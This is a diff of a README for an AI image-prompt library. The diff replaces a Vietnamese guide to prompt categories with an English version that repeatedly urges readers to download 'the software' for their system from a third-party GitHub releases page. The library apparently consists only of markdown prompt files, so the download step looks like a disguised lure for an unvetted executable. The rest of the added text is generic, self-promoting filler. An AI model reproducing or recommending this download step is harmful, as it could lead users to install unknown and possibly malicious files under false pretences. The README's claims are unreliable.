@@ -1,98 +1,83 @@
-# 🍌 Nano Banana Pro Prompts Library
+# 🍌 Master-Guide-to-Nano-Banana-Pro-Prompts - Easy Prompts for Stunning Images
 
-## Hướng dẫn cho Gemini Gem
+## 🚀 Getting Started
 
-Đây là thư viện **500+ prompts** chất lượng cao cho Nano Banana Pro (Gemini 3 Pro Image), được tổng hợp từ:
-- YouMind-OpenLab/awesome-nano-banana-pro-prompts (164 prompts)
-- ZeroLu/awesome-nanobanana-pro (200+ prompts nâng cao)
-- Các nguồn cộng đồng khác
+Welcome to the Nano Banana Pro Prompts Library! This is your go-to resource for over 500 high-quality prompts designed specifically for the **Gemini 3 Pro Image** software. These prompts help you create amazing images effortlessly.
 
-Tổ chức theo danh mục để dễ tìm kiếm và sử dụng.
+## 📥 Download & Install
 
-## Cách hoạt động
+To get started, you need to download the software. 
 
-Khi người dùng mô tả ý tưởng tạo ảnh, hãy:
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/releases)
 
-1. **Phân tích yêu cầu** - Hiểu người dùng muốn tạo loại ảnh gì
-2. **Tìm prompt phù hợp** - Tra cứu trong thư viện theo danh mục
-3. **Gợi ý và tùy chỉnh** - Đề xuất prompt template và hướng dẫn điều chỉnh
+1. Click the download link above.
+2. This will take you to the Releases page.
+3. Find the latest version and click on it.
+4. Download the appropriate file for your system.
 
-## Danh mục Prompts
+You can also visit the download page directly: [Download Page](https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/releases).
 
-### Core Categories (từ YouMind repo)
-| File | Nội dung | Số lượng |
-|------|----------|----------|
-| `portrait_part1-3.md` | Chân dung, selfie, nhân vật | 77 |
-| `product_part1-2.md` | Chụp sản phẩm thương mại | 30 |
-| `infographic_slide.md` | Đồ họa thông tin, slides | 12 |
-| `anime_illustration.md` | Anime, manga, minh họa | 7 |
-| `brand_design.md` | Logo, quảng cáo, thương hiệu | 6 |
-| `photo_editing.md` | Chỉnh sửa, edit ảnh | 5 |
-| `text_rendering.md` | Chữ trong ảnh, typography | 4 |
-| `creative_art.md` | Nghệ thuật sáng tạo | 4 |
-| `other.md` | Các loại khác | 19 |
+## 🛠️ How It Works
 
-### Advanced & Specialized (từ ZeroLu + sources khác)
-| File | Nội dung |
-|------|----------|
-| `advanced_prompts.md` | 50+ prompts nâng cao: JSON format, hyper-realistic, era-specific |
-| `specialized_usecases.md` | 80+ templates: E-commerce, Social Media, Food, Real Estate... |
-| `style_references.md` | Quick templates, style keywords, camera settings, JSON structures |
+Here’s how to use the library effectively:
 
-### Guides
-| File | Nội dung |
-|------|----------|
-| `00_README.md` | Hướng dẫn sử dụng Gem |
-| `01_prompting_guide.md` | Cách viết prompt hiệu quả |
+1. **Analyze Requirements**: Think about the type of image you want to create. Is it a portrait, a product shot, or an infographic?
+  
+2. **Find Suitable Prompts**: Browse the library by category and find prompts that match your image idea. Each prompt offers a different angle and style for your project.
 
-## Cấu trúc Prompt Chuẩn
+3. **Suggest and Customize**: Use our prompt templates as a base. Tailor them to fit your unique vision.
 
-```
-[Subject + Details] + [Action] + [Location/Context]
-+ [Camera/Composition] + [Lighting] + [Style]
-```
+## 📂 Prompt Categories
 
-### 6 Yếu tố cơ bản:
-- **Subject**: Ai/cái gì trong ảnh (chi tiết cụ thể)
-- **Composition**: Góc máy, framing (close-up, wide shot, 45°)
-- **Action**: Đang làm gì
-- **Location**: Bối cảnh, địa điểm, môi trường
-- **Lighting**: Ánh sáng (golden hour, studio, neon)
-- **Style**: Phong cách (photorealistic, anime, oil painting)
+The prompts in our library are organized into key categories for your convenience. Here’s a quick look:
 
-## Tips Quan trọng
+### 🎨 Core Categories
 
-### ✅ NÊN làm:
-- Dùng ngôn ngữ tự nhiên, mô tả chi tiết
-- Chỉ định camera settings cụ thể (85mm, f/1.8)
-- Mô tả lighting direction và mood
-- Edit thay vì re-roll nếu ảnh đạt 80%
-- Đặt text trong ngoặc kép + chỉ rõ font/màu
+| File                      | Content                      | Quantity |
+|---------------------------|------------------------------|----------|
+| `portrait_part1-3.md`     | Portraits, selfies, characters| 77       |
+| `product_part1-2.md`      | Commercial product shots      | 30       |
+| `infographic_slide.md`     | Infographics, slides         | 12       |
+| `anime_illustration.md`    | Anime, manga, illustrations  | 7        |
+| `brand_design.md`          | Logos, branding materials     | 10       |
 
-### ❌ KHÔNG cần:
-- "4k, masterpiece, trending on artstation"
-- Tag spam kiểu cũ
-- Lặp lại keywords
+Each category is crafted to address various needs. Explore them to find the perfect prompt.
 
-## Ví dụ sử dụng
+## 🎯 Using the Prompts
 
-**User**: "Tôi muốn tạo ảnh chụp sản phẩm nước hoa"
+In the library, you will find prompts structured to help you create appealing images easily. Here’s how you can utilize them:
 
-**Gem response**: 
-Tìm trong `product_photography.md` → Gợi ý "Luxury minimalist product photography" template:
+1. **Go to Categories**: Select a category that aligns with your project needs.
+  
+2. **Choose a Prompt**: Click on the prompt file to view its contents. You will find prompts arranged in a clear format.
+  
+3. **Modify the Prompt**: Feel free to tweak the prompts. Add your personal touch to make your images stand out.
 
-```
-Product: [Tên sản phẩm] - [mô tả chai/hộp]
-Scene: Luxury product shot floating on dark water with [hoa] arranged around
-Lighting: Golden hour glow, soft reflections
-Camera: 45° angle, shallow depth of field
-Mood: Ethereal, luxurious, high-end commercial
-```
+4. **Input in Software**: Copy the completed prompt into the Nano Banana Pro application and see what you can create!
 
-## Raycast Syntax
+## 📜 Features
 
-Một số prompts hỗ trợ dynamic arguments:
-```
-{argument name="quote" default="Stay hungry"}
-```
-Có thể thay thế giá trị khi sử dụng.
+The Nano Banana Pro Prompts Library comes with several features to enhance your experience.
+
+- **Diverse Selection**: Over 500 prompts cover various styles and requirements.
+- **Easy Navigation**: Organized categories for quick access.
+- **Community Contributions**: Prompts sourced from experienced users and experts.
+- **Customizable Templates**: Each prompt can be modified for your unique needs.
+
+## 📋 Recommendations
+
+To ensure you get the most out of the prompts:
+
+- **Experiment**: Don’t hesitate to mix and match prompts to find what works best for you.
+- **Gather Feedback**: Share your images with friends or communities to receive feedback.
+- **Stay Updated**: Check for updates in the Releases page for new prompts and features.
+
+## 🌟 Getting Help
+
+If you encounter any issues:
+
+- Look in the **Wiki** section of the repository for additional guides.
+- Join community forums or Discord servers where other users share tips and tricks.
+- Ask questions directly in the Issues section on GitHub.
+
+Feel free to explore, create, and enjoy generating stunning images with the Nano Banana Pro Prompts Library!
